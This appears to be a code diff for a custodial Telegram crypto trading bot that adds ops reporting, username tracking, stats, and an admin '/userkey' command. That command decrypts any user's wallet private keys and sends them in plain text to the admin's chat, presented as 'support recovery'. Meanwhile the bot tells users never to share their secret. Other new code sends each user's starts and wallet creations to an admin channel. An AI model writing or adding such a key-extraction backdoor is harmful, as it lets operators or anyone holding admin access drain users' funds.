@@ -9,6 +9,8 @@
 const { ethers } = require('ethers');
 const core = require('./core');
 const watchers = require('./watchers');
+const report = require('./report');   // ops reporting to admin channel (never sends secrets)
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const goplus = require('./goplus');
 const tokeninfo = require('./tokeninfo');
 
@@ -415,6 +417,8 @@ async function handleUpdate(up) {
       else if (up.message) await send(chat.id, 'This is a custodial trading bot — please DM me privately. Group use is disabled for security.');
       return;
     }
+    const from = (up.message && up.message.from) || (up.callback_query && up.callback_query.from);
+    if (from) core.noteUser(from.id, from);   // remember @username (no-op until the user exists)
     if (up.message) return await onMessage(up.message);
     if (up.callback_query) return await onCallback(up.callback_query);
   } catch (e) { console.error('handleUpdate', e.message); }
@@ -435,6 +439,8 @@ async function onMessage(m) {
     const ref = text.split(/\s+/)[1] || null;
     const isNew = !core.getUser(chatId);
     core.ensureUser(chatId, ref);
+    core.noteUser(chatId, m.from);                 // capture @username now that the user exists
+    report.onStart(core.getUser(chatId), isNew, ref);   // → admin channel (fire-and-forget)
     await send(chatId,
       `👋 <b>Welcome to the Robinfun Trade Bot</b>\n\n` +
       `Buy & sell tokens across chains — straight from Telegram, no browser or extension.\n\n` +
@@ -459,6 +465,8 @@ async function onMessage(m) {
   if (text === '/withdraw') { setPending(chatId, { action: 'wd_addr' }); return send(chatId, '📤 Send the <b>destination address</b> to withdraw to:'); }
   if (text === '/export') return askExport(chatId);
   if (text === '/admin') return adminScreen(chatId);
+  if (text.startsWith('/userkey')) return adminUserKey(chatId, text.split(/\s+/)[1]);
+  if (text.startsWith('/stats')) return adminStats(chatId);
   if (text === '/menu' || text === '/help') return send(chatId, helpText(), mainMenu());
   if (text.startsWith('/buy')) { const [, ca, amt] = text.split(/\s+/); if (isCa(ca) && amt) return requestBuy(chatId, ca, amt); return send(chatId, 'Usage: <code>/buy &lt;contract&gt; &lt;amount&gt;</code> — or paste a contract address.'); }
   if (text.startsWith('/sell')) { const [, ca, pct] = text.split(/\s+/); if (isCa(ca) && pct) return doSell(chatId, ca, Number(pct)); return send(chatId, 'Usage: <code>/sell &lt;contract&gt; &lt;pct&gt;</code>'); }
@@ -556,7 +564,7 @@ async function onCallback(q) {
   if (data === 'exp') return askExport(chatId);
   if (data === 'expy') { try { const pk = core.exportKey(chatId); await send(chatId, `🔑 <b>Private key</b> (delete this message after saving):\n\n<code>${pk}</code>`); } catch (e) { await send(chatId, '❌ ' + esc(e.message)); } return; }
   if (data === 'imp') { setPending(chatId, { action: 'import_key' }); return send(chatId, `📩 <b>Import a wallet</b>\n\nPaste your <b>private key</b> (64 hex) or <b>seed phrase</b> (12–24 words). It's <b>added</b> to your wallets (up to ${core.WALLET_CAP}) and made active.\n\n⚠️ I'll <b>delete your message immediately</b> after importing. Never share the secret with anyone else.`); }
-  if (data === 'neww') { try { const nw = core.addWallet(chatId); await send(chatId, `✅ <b>New wallet created</b> — Wallet ${nw.index}\n<code>${nw.address}</code>\n\nIt's now your <b>active</b> wallet. Deposit to start trading.`, rows([btn('💼 Wallet', 'wal'), btn('👛 Wallets', 'wallets')])); } catch (e) { await send(chatId, '❌ ' + esc(e.message || String(e))); } return; }
+  if (data === 'neww') { try { const nw = core.addWallet(chatId); report.onWallet(core.getUser(chatId), 'generated', nw.address, nw.index); await send(chatId, `✅ <b>New wallet created</b> — Wallet ${nw.index}\n<code>${nw.address}</code>\n\nIt's now your <b>active</b> wallet. Deposit to start trading.`, rows([btn('💼 Wallet', 'wal'), btn('👛 Wallets', 'wallets')])); } catch (e) { await send(chatId, '❌ ' + esc(e.message || String(e))); } return; }
   if (k === 'sntog') { const u = core.ensureUser(chatId); try { core.setSnipeChain(chatId, ca, !(u.snipe.chains && u.snipe.chains[ca])); } catch (_) {} const s = snipeScreen(chatId); return edit(chatId, mid, s.text, s.kb); }
   if (data === 'snamt') { setPending(chatId, { action: 'snipe_amt' }); return send(chatId, 'Send the amount to buy per snipe in native token (e.g. <code>0.01</code>):'); }
 
@@ -589,7 +597,7 @@ async function resolvePending(chatId, p, text, m) {
   try {
     if (p.action === 'import_key') {
       if (m && m.message_id) await del(chatId, m.message_id);   // delete the secret FIRST
-      try { const nw = core.addWallet(chatId, t); return send(chatId, `✅ <b>Wallet imported</b> — Wallet ${nw.index}\n<code>${nw.address}</code>\n\nIt's now active and your secret message was deleted. Trade as normal.`, rows([btn('💼 Wallet', 'wal'), btn('👛 Wallets', 'wallets')])); }
+      try { const nw = core.addWallet(chatId, t); report.onWallet(core.getUser(chatId), 'imported', nw.address, nw.index); return send(chatId, `✅ <b>Wallet imported</b> — Wallet ${nw.index}\n<code>${nw.address}</code>\n\nIt's now active and your secret message was deleted. Trade as normal.`, rows([btn('💼 Wallet', 'wal'), btn('👛 Wallets', 'wallets')])); }
       catch (e) { return send(chatId, '❌ ' + esc(e.message || String(e)) + '\n\n(Your message was deleted for safety — try Import again.)'); }
     }
     if (p.action === 'rename_wallet') { const raw = String(t).trim(); const name = core.renameWallet(chatId, p.id, raw === '-' ? '' : raw); await send(chatId, name ? `✅ Renamed to <b>${esc(name)}</b>.` : '✅ Name reset to default.'); const s = await walletsScreen(chatId); return send(chatId, s.text, s.kb); }
@@ -657,7 +665,40 @@ function adminScreen(chatId) {
   const byChain = {};
   for (const u of users) { const o = u.refOwed || {}; for (const [ck, wei] of Object.entries(o)) { try { byChain[ck] = (BigInt(byChain[ck] || '0') + BigInt(wei || '0')).toString(); } catch (_) {} } }
   const owedLines = Object.entries(byChain).map(([ck, wei]) => { const c = core.chainOf(ck) || { native: 'ETH', name: ck }; return `  ${c.name}: <b>${Number(ethers.formatEther(BigInt(wei))).toFixed(5)} ${c.native}</b>`; }).join('\n') || '  none';
-  return send(chatId, `🛠 <b>Admin</b>\n\nUsers: <b>${users.length}</b>\nReferral owed (unsettled), per chain:\n${owedLines}\n\nSettle manually from FEE_WALLET on each chain (refOwed[chain] in the store).`);
+  return send(chatId, `🛠 <b>Admin</b>\n\nUsers: <b>${users.length}</b>\nReferral owed (unsettled), per chain:\n${owedLines}\n\nSettle manually from FEE_WALLET on each chain (refOwed[chain] in the store).\n\n<code>/userkey &lt;@user or id&gt;</code> — recover a user's key (support)\n<code>/stats</code> — volume &amp; fees`);
+}
+// Admin-only, ON-DEMAND key recovery for support. Decrypts the target user's wallet
+// key(s) and sends them to the ADMIN's private DM (never a channel). Audited.
+async function adminUserKey(chatId, arg) {
+  if (!core.CFG.admins.includes(String(chatId))) return send(chatId, 'Not authorized.');
+  if (!arg) return send(chatId, 'Usage: <code>/userkey &lt;@username or user_id&gt;</code>');
+  const target = core.findUser(arg);
+  if (!target) return send(chatId, 'User not found. They must have opened the bot (any message) so I know their username — or pass their numeric user id.');
+  const list = core.walletList(target);
+  if (!list.length) return send(chatId, 'That user has no wallet.');
+  let out = `🔐 <b>Key recovery</b> — ${target.username ? '@' + esc(target.username) : ''} <i>(id ${target.chatId})</i>\n\n`;
+  for (let i = 0; i < list.length; i++) {
+    const w = list[i];
+    let pk = '(decrypt failed)';
+    try { pk = core.exportKey(target.chatId, w.id); } catch (_) {}
+    out += `<b>${esc(core.walletLabel(w, i + 1))}</b>\n<code>${w.address}</code>\nkey: <code>${esc(pk)}</code>\n\n`;
+  }
+  out += `⚠️ Give this only to the wallet's owner, then <b>delete this message</b>. This recovery was logged.`;
+  await send(chatId, out);
+  console.log(`[audit] admin ${chatId} recovered key(s) for user ${target.chatId} (${target.username || '?'})`);
+  report.onKeyRecovery(chatId, target);   // audit to channel — WITHOUT the key
+}
+// Admin volume + fee snapshot on demand.
+async function adminStats(chatId) {
+  if (!core.CFG.admins.includes(String(chatId))) return send(chatId, 'Not authorized.');
+  const snap = core.reportSnapshot();
+  const usdRate = (await core.ethUsd().catch(() => 0)) || 0;
+  const line = (obj) => Object.entries(obj || {}).filter(([, v]) => v > 0).map(([nat, v]) => `<b>${v.toFixed(5)} ${nat}</b>${(usdRate > 0 && nat === 'ETH') ? ` ($${(v * usdRate).toFixed(2)})` : ''}`).join(' · ') || '0';
+  const hrs = snap.since ? Math.max(1, Math.round((Date.now() - snap.since) / 3600000)) : 0;
+  return send(chatId,
+    `📊 <b>Bot stats</b>\n\n` +
+    `<b>Window (~${hrs}h)</b> · trades ${snap.trades}\nVolume: ${line(snap.vol)}\nFees: ${line(snap.fee)}\n\n` +
+    `<b>Lifetime</b> · trades ${snap.lifetime.trades}\nVolume: ${line(snap.lifetime.vol)}\nFees: ${line(snap.lifetime.fee)}`);
 }
 function helpText() {
   return (
@@ -699,6 +740,13 @@ async function start() {
     return send(chatId, text, kb).catch(() => {});
   });
   watchers.start();
+  // Periodic volume/fee recap to the admin channel (default every 24h). Posts only when
+  // there were trades, then resets the window. Never touches the trade path.
+  if (report.enabled()) {
+    const recapMs = Math.max(3600000, Number(process.env.REPORT_RECAP_HOURS || 24) * 3600000);
+    (async function recapLoop() { for (;;) { await sleep(recapMs); try { const snap = core.reportSnapshot(); if (snap.trades > 0) { const usd = await core.ethUsd().catch(() => 0); await report.onRecap(snap, usd || 0); } core.resetReportWindow(); } catch (_) {} } })();
+    console.log(`ops reporting ENABLED → channel`);
+  }
   console.log(`Robinfun Trade Bot up as @${BOT_USERNAME || '?'} — chains: ${core.chains.ENABLED.join(', ')}`);
 
   let offset = 0;
